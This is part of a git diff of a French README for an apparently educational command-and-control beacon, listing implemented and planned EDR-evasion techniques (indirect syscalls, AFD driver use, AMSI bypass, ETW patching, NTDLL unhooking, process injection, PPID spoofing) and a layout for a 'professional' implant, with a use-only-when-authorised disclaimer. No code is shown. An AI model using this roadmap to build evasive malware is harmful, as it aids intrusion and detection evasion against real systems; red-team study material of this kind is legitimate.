+| AFD_CONNECT STATUS_INVALID_PARAMETER | Mauvaise structure sockaddr | Vérifier `custom_inet_addr()` et `custom_htons()` |
+| PEB access violation | Mauvais offset | Vérifier structures PEB dans types.h |
 
 ---
 
@@ -613,60 +492,84 @@ Pour utiliser DebugView, modifie la macro DEBUG_PRINT dans main.c :
 
 ### Améliorations possibles
 
-1. **Chiffrement** : AES pour les communications
-2. **Jitter** : Randomiser le sleep (anti-détection)
-3. **Injection** : Injecter dans un autre process
-4. **Persistence** : Registry, scheduled tasks
-5. **Plus de commandes** : Upload, download, screenshot
-6. **HTTPS** : Chiffrer le transport
+1. **Full NtCreateUserProcess** : Remplacer CreateProcessA temporaire
+2. **HTTPS/TLS** : Wrapper Schannel avec syscalls
+3. **Sleep obfuscation** : Chiffrer heap/stack pendant les sleeps
+4. **API unhooking** : Restaurer ntdll.dll clean depuis le disque
+5. **String obfuscation** : XOR/RC4 pour cacher strings
+6. **Process injection** : Shellcode execution via syscalls
+7. **PPID spoofing** : Modifier le parent process ID
 
-### Ressources pour apprendre
+### Techniques d'évasion expliquées
 
-**C en général :**
-- [Beej's Guide to C Programming](https://beej.us/guide/bgc/)
-- "The C Programming Language" (K&R)
+| Technique | Implémenté | Difficulté |
+|-----------|------------|------------|
+| Indirect syscalls | ✅ Oui (SysWhispers3) | Moyenne |
+| AFD driver direct | ✅ Oui (bypass ws2_32) | Moyenne |
+| HTTP custom stack | ✅ Oui (bypass WinHTTP) | Faible |
+| PEB direct access | ✅ Oui (bypass API) | Faible |
+| Registry syscalls | ✅ Oui (NtOpenKey) | Faible |
+| Sleep obfuscation | ❌ Non | Élevée |
+| NTDLL unhooking | ❌ Non | Moyenne |
+| PPID spoofing | ❌ Non | Moyenne |
 
-**Windows API :**
-- [Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/)
-- [Windows Internals](https://docs.microsoft.com/en-us/sysinternals/)
+### Ressources
 
-**Développement offensif :**
-- [MalDev Academy](https://maldevacademy.com/)
+**Syscalls & Evasion :**
+- [SysWhispers3](https://github.com/klezVirus/SysWhispers3)
+- [AFD Driver Internals](https://github.com/microsoft/windows-drivers-rs)
+- [Maldev Academy](https://maldevacademy.com/)
+
+**Windows Internals :**
+- [Windows Internals 7th Edition](https://www.microsoftpressstore.com/store/windows-internals-part-1-9780735684188)
+- [ReactOS Source Code](https://github.com/reactos/reactos) - Documentation NT structures
+
+**Red Team :**
 - [Red Team Notes](https://www.ired.team/)
-- [Sektor7 Courses](https://institute.sektor7.net/)
+- [Sektor7 Malware Development](https://institute.sektor7.net/)
 
-### Structure d'un "vrai" beacon
+---
+
+## Architecture d'un beacon professionnel
 
 ```
 beacon/
 ├── core/
 │   ├── beacon.c          # Boucle principale
 │   ├── config.c          # Configuration chiffrée
-│   └── crypto.c          # AES, RC4, etc.
+│   └── sleep.c           # Sleep obfuscation
 ├── comms/
-│   ├── http.c            # HTTP/HTTPS
+│   ├── http.c            # HTTP/HTTPS custom
 │   ├── dns.c             # DNS tunneling
-│   └── smb.c             # Named pipes
+│   └── smb.c             # Named pipes lateral movement
 ├── commands/
 │   ├── shell.c           # Exécution commandes
 │   ├── file.c            # Upload/download
-│   ├── process.c         # Process injection
-│   └── token.c           # Token manipulation
+│   ├── inject.c          # Process/DLL injection
+│   ├── token.c           # Token manipulation
+│   └── screenshot.c      # Capture d'écran
 ├── evasion/
-│   ├── unhook.c          # Unhook NTDLL
-│   ├── syscalls.c        # Direct syscalls
-│   └── amsi.c            # AMSI bypass
-└── loader/
-    ├── reflective.c      # Reflective loading
-    └── shellcode.c       # Shellcode conversion
+│   ├── unhook.c          # NTDLL unhooking
+│   ├── syscalls.c        # Indirect syscalls (SysWhispers3)
+│   ├── amsi.c            # AMSI bypass
+│   ├── etw.c             # ETW patching
+│   └── sandbox.c         # Sandbox detection
+└── crypto/
+    ├── aes.c             # AES-256 encryption
+    ├── rsa.c             # RSA key exchange
+    └── hash.c            # SHA-256, MD5
 ```
 
 ---
 
 ## License
 
-Ce code est fourni à des fins éducatives uniquement. Utilise-le de manière responsable et légale, uniquement sur des systèmes que tu es autorisé à tester.
+Ce code est fourni **à des fins éducatives uniquement**.
+
+⚠️ **AVERTISSEMENT** : L'utilisation de techniques d'évasion EDR et de syscalls directs dans un contexte non autorisé est illégale. Ce projet est destiné aux professionnels de la sécurité, chercheurs, et étudiants dans des environnements contrôlés (labs, CTF, pentests autorisés).
+
+Utilise-le de manière **responsable** et **légale**, uniquement sur des systèmes que tu es autorisé à tester.
 
 ---
 
-*Happy hacking! 🎯*
+**Happy (ethical) hacking! 🎯**
